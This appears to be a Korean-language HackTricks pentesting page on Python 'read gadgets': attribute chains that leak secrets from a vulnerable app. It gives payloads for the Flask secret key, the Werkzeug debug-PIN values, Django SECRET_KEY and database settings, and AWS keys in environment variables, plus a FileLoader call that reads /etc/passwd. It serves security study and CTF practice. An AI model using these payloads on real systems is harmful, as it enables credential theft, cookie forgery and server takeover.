# Python Internal Read Gadgets

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

[**Python Format Strings**](bypass-python-sandboxes/index.html#python-format-string) 또는 [**Class Pollution**](class-pollution-pythons-prototype-pollution.md)과 같은 다양한 취약점을 통해 **Python 내부 데이터를 읽을 수 있지만 코드를 실행할 수는 없을 수 있습니다**. 따라서 pentester는 이러한 읽기 권한을 최대한 활용하여 **민감한 권한을 획득하고 취약점을 escalate**해야 합니다.

### Flask - secret key 읽기

Flask 애플리케이션의 메인 페이지에는 이 **secret이 구성된** **`app`** 전역 객체가 있을 가능성이 높습니다.
```python
app = Flask(__name__, template_folder='templates')
app.secret_key = '(:secret:)'
```
이 경우 [**Bypass Python sandboxes 페이지**](bypass-python-sandboxes/index.html)의 **global objects에 접근**하는 gadget을 사용하면 이 객체에 접근할 수 있습니다.

**취약점이 다른 Python 파일에 있는 경우**, 파일을 순회하는 gadget이 필요합니다. 이를 통해 메인 파일에 도달하여 **global object `app.secret_key`에 접근**하고, 이 키를 알고 [**권한을 상승**](../../network-services-pentesting/pentesting-web/flask.md#flask-unsign)할 수 있습니다.

다음과 같은 payload를 사용할 수 있습니다 [이 writeup에서 가져옴](https://ctftime.org/writeup/36082):
```python
__init__.__globals__.__loader__.__init__.__globals__.sys.modules.__main__.app.secret_key
```
이 payload를 사용하여 **`app.secret_key`를 읽을** 수 있습니다. 원래 bug에서 write primitive(예: class pollution)도 제공한다면, 동일한 경로를 사용하여 해당 값을 교체하고 더 높은 권한의 Flask cookie에 서명할 수 있습니다.

### Werkzeug - machine_id 및 node uuid

[**이 writeup의 payload 사용**](https://vozec.fr/writeups/tweedle-dum-dee/)을 통해 **machine_id**와 **uuid** node에 접근할 수 있습니다. 이 값들은 [**Werkzeug pin을 생성하고**](../../network-services-pentesting/pentesting-web/werkzeug.md) debug mode가 활성화된 경우 `/console`의 python console에 접근하는 데 필요한 **private bits**입니다:
```python
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug]._machine_id}
{ua.__class__.__init__.__globals__[t].sys.modules[werkzeug.debug].uuid._node}
```
> [!WARNING]
> 웹 페이지에서 **error**를 발생시키면 **app.py**에 대한 **서버의 로컬 경로**를 확인할 수 있으며, 이 **error**가 **경로를 제공**한다는 점에 유의하세요.

취약점이 다른 python 파일에 있는 경우, 메인 python 파일의 객체에 액세스하려면 이전 Flask 트릭을 확인하세요.

### Django - SECRET_KEY 및 settings module

Django settings 객체는 애플리케이션이 시작되면 `sys.modules`에 캐시됩니다. read primitive만으로도 **SECRET_KEY**, fallback keys, database credentials 또는 signing salts를 leak할 수 있습니다:
```python
# When DJANGO_SETTINGS_MODULE is set (usual case)
sys.modules[os.environ['DJANGO_SETTINGS_MODULE']].SECRET_KEY

# Through the global settings proxy
a = sys.modules['django.conf'].settings
(a.SECRET_KEY, a.SECRET_KEY_FALLBACKS, a.DATABASES, a.SIGNING_BACKEND,
a.SESSION_ENGINE, a.SESSION_SERIALIZER)
```
취약한 gadget이 다른 module에 있다면, 먼저 globals를 순회합니다:
```python
__init__.__globals__['sys'].modules['django.conf'].settings.SECRET_KEY
```
`SECRET_KEY_FALLBACKS`는 현재 `SECRET_KEY`만큼이나 유용합니다. rotation 중에도 이전에 서명된 값을 여전히 검증하기 때문입니다. 또한 `SESSION_ENGINE`과 `SESSION_SERIALIZER`를 leak하면 영향이 cookie forgery에만 국한되는지, 아니면 더 강력한 영향이 있는지 빠르게 확인할 수 있습니다. web 영향에 대한 자세한 내용은 [**Django pentesting page**](../../network-services-pentesting/pentesting-web/django.md)를 확인하세요.

### Module loader gadgets - source code 및 files 읽기

로드된 Python modules는 일반적으로 `__loader__`를 유지합니다. File-backed loaders는 자주 `get_source()` 및 `get_data()`를 노출하며, `module object`에는 이미 접근할 수 있지만 `open()`에는 접근할 수 없을 때 매우 유용한 **read-only primitives**입니다:
```python
m = __init__.__globals__['sys'].modules['__main__']
m.__loader__.get_source(m.__name__)   # source of app.py / __main__
m.__loader__.get_data(m.__file__)     # raw bytes of the same file
```
이는 **config modules, blueprints, helper files 또는 hidden routes**를 dump하고 API keys, DSNs, flag paths 또는 추가 gadget entry points를 복구하는 데 매우 유용합니다.

subclass enumeration만 가능한 경우, index를 hard-coding하는 대신 이름으로 loader를 검색하세요:
```python
# unbound call: first argument acts as a dummy self
[c for c in object.__subclasses__() if c.__name__ == 'FileLoader'][0].get_data('.', '/etc/passwd')
```
### Generator / coroutine frame globals

generator/coroutine object를 생성하거나 접근할 수 있다면, 어떤 function `__globals__` gadget도 필요 없이 해당 frame에서 globals를 leak할 수 있습니다. 이는 dunder name만 차단하고 `gi_frame`, `ag_frame`, `cr_frame` 또는 `f_globals`와 같은 frame attributes를 간과하는 filter를 우회할 때 유용합니다:
```python
(_ for _ in ()).gi_frame.f_globals['__builtins__']
(_ for _ in ()).gi_frame.f_globals['sys'].modules['os'].environ
```
frame globals를 확보했다면 다른 gadgets와 동일하게 계속 진행하세요(`sys.modules`, settings objects, `os.environ` 등). 최근 sandbox escape에서 이 방법이 계속 재발견되는 이유는 `gi_frame`과 `f_globals`가 dunder attributes가 아니며, 단순한 deny-list를 우회하는 경우에도 자주 남아 있기 때문입니다.

### 로드된 모듈을 통한 환경 변수 / cloud creds

많은 jail은 여전히 어딘가에서 `os` 또는 `sys`를 import합니다. 접근 가능한 모든 함수의 `__init__.__globals__`를 악용하여 이미 import된 `os` 모듈로 pivot한 다음, API tokens, cloud keys 또는 플래그가 포함된 **환경 변수**를 덤프할 수 있습니다:
```python
# Classic os._wrap_close subclass index may change per version
cls = [c for c in object.__subclasses__() if 'os._wrap_close' in str(c)][0]
cls.__init__.__globals__['os'].environ['AWS_SECRET_ACCESS_KEY']
```
서브클래스 인덱스가 필터링된 경우 loaders를 사용하세요:
```python
__loader__.__init__.__globals__['sys'].modules['os'].environ['FLAG']
```
환경 변수는 read에서 full compromise로 이동하는 데 필요한 유일한 secrets인 경우가 많습니다(cloud IAM keys, database URLs, signing keys 등).

### Django-Unicorn class pollution (CVE-2025-24370)

`django-unicorn` ([**GHSA-g9wf-5777-gq43**](https://github.com/adamghill/django-unicorn/security/advisories/GHSA-g9wf-5777-gq43), `<0.62.0`)은 조작된 component requests를 통한 **class pollution**을 허용했습니다. `__init__.__globals__`와 같은 property path를 설정하면 attacker가 component module globals와 그 안에서 import된 모듈(예: `settings`, `os`, `sys`)에 접근할 수 있었습니다. 이를 통해 code execution 없이 `SECRET_KEY`, `DATABASES` 또는 service credentials을 leak할 수 있습니다. 이 exploit chain은 순수하게 read 기반이며 위와 동일한 dunder-gadget patterns를 사용합니다.

### Gadget collections for chaining

최근 CTF와 pyjail research에서는 attribute access와 subclass enumeration만으로 구축된 안정적인 read chains가 확인되었습니다. [**pyjailbreaker**](https://github.com/jailctf/pyjailbreaker)와 같이 community가 유지 관리하는 lists는 objects에서 `__globals__`, `sys.modules`, 그리고 최종적으로 sensitive data까지 탐색할 수 있도록 조합 가능한 수백 개의 minimal gadgets를 정리합니다. raw subclass indexes보다 **attribute/name based searches**를 우선 사용하세요. `os._wrap_close`, `FileLoader`, `warnings.catch_warnings` 등의 위치는 Python versions 간에, 그리고 추가로 imported된 libraries에 따라 변경되기 때문입니다.

## References

- [Django cryptographic signing docs](https://docs.djangoproject.com/en/6.0/topics/signing/)
- [pyjailbreaker – Python sandbox gadget wiki](https://github.com/jailctf/pyjailbreaker)
{{#include ../../banners/hacktricks-training.md}}
